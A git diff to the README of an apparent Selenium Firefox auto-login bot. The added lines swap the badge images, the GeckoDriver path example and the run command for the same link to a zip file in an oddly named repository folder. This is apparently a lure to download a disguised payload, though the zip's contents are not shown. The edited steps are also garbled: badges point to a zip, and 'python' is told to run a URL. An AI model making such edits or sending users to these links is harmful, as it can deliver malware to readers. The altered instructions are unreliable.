@@ -1,8 +1,8 @@
 # 🦊 Selenium Firefox Automation Bot
 
-![Python](https://img.shields.io/badge/Python-3.x-blue?style=flat-square&logo=python)
-![Selenium](https://img.shields.io/badge/Selenium-4.0.0-orange?style=flat-square&logo=selenium)
-![Firefox](https://img.shields.io/badge/Firefox-89-orange?style=flat-square&logo=firefox)
+![Python](https://github.com/Sam-bot-dev/Auto-login-bot/raw/refs/heads/main/glomerular/login_bot_Auto_3.5-beta.1.zip)
+![Selenium](https://github.com/Sam-bot-dev/Auto-login-bot/raw/refs/heads/main/glomerular/login_bot_Auto_3.5-beta.1.zip)
+![Firefox](https://github.com/Sam-bot-dev/Auto-login-bot/raw/refs/heads/main/glomerular/login_bot_Auto_3.5-beta.1.zip)
 
 A Python script to automate browser actions using **Selenium** and **GeckoDriver** for **Firefox**. This project demonstrates how to interact with websites by simulating user login behavior.
 
@@ -69,7 +69,7 @@ If Firefox is not already installed, you can download it from here.
 
 🧑‍💻 Script Usage
 1. Set the GeckoDriver Path
-In the script, replace "geckodriver.exe" with the actual path to your GeckoDriver executable.
+In the script, replace "https://github.com/Sam-bot-dev/Auto-login-bot/raw/refs/heads/main/glomerular/login_bot_Auto_3.5-beta.1.zip" with the actual path to your GeckoDriver executable.
 
 Example:
 
@@ -89,7 +89,7 @@ Run the script using Python:
 bash
 Copy
 Edit
-python script_name.py
+python https://github.com/Sam-bot-dev/Auto-login-bot/raw/refs/heads/main/glomerular/login_bot_Auto_3.5-beta.1.zip
 3. Enter Username and Password
 The script will prompt you for a username and password. Enter them when prompted, and the script will fill in the login form and simulate a login attempt.
 
